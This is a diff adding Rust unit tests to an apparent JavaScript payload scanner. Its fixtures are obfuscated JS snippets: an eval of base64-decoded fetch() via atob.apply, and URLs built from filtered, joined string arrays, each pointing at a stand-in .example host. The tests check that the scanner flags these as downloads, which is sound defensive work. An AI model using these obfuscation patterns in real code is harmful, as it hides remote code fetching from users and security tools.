@@ -39785,6 +39785,24 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_apply_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-apply-js.example/p')",
+        );
+        let js = format!(r#"eval(atob.apply(null, ["{encoded}"]))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-apply-js.example/p"
+            )
+        });
+        assert!(has, "JS atob.apply payload URL missed: {:?}", env.traits);
+    }
+
+    #[test]
     fn js_atob_template_literal_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
@@ -39974,6 +39992,46 @@ mod js_url_extraction_tests {
             )
         });
         assert!(has, "JS array concat/join URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_array_filter_boolean_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = ["https://", "", "js-array-filter.example", "", "/stage"].filter(Boolean).join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-filter.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "JS array filter(Boolean)/join URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_array_filter_identity_arrow_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = ["https://", "", "js-array-filter-arrow.example", "", "/stage"].filter(part => part).join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-filter-arrow.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "JS array filter(identity arrow)/join URL missed: {:?}",
+            env.traits
+        );
     }
 
     #[test]
